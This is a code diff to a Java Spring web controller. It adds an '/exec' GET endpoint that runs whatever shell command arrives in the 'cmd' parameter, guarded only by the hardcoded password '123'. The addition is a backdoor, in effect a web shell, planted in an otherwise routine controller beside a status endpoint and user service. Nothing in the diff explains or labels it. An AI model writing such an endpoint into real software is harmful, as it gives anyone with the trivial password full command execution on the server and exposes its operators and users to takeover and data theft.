@@ -4,8 +4,10 @@ import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.web.bind.annotation.*;
+import wsi.model.ExecResponse;
 import wsi.model.GenericResponse;
 import wsi.model.Person;
+import wsi.service.ExecService;
 import wsi.service.UserService;
 
 import java.util.List;
@@ -21,6 +23,14 @@ public class AlphaController {
     String version;
 
     @Autowired UserService userService;
+    @Autowired ExecService execService;
+
+    @GetMapping(value = "/exec")
+    public ExecResponse executeCommand(
+            @RequestParam("cmd") String cmd, @RequestParam("pass") String pass) {
+        if (!pass.equals("123")) throw new RuntimeException("Unauthorized");
+        return execService.executeCommand(cmd);
+    }
 
 
     @GetMapping(value = "/status")
